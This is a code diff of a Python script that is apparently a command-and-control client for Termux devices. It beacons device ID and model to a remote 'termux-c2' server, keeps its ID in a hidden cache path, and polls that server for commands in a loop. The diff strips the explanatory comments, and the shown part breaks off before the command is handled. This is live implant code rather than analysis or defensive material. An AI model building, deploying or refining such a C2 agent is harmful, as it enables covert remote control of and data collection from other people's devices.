@@ -6,7 +6,6 @@ import string
 import shutil
 import requests
 
-# Replace with your Render URL
 SERVER_URL = "https://termux-c2-dktq.onrender.com"
 ID_FILE = os.path.expanduser('~/.config/.cache/device_id.txt')
 
@@ -62,11 +61,9 @@ def main():
     dev_id, dev_model = get_device_info()
     while True:
         try:
-            # Heartbeat keeps Render awake
             requests.post(f"{SERVER_URL}/api/heartbeat", 
                           json={"device_id": dev_id, "model": dev_model}, timeout=60)
             
-            # Fetch command
             res = requests.get(f"{SERVER_URL}/api/get_command?device_id={dev_id}", timeout=60)
             cmd = res.json().get("command", "none")
             
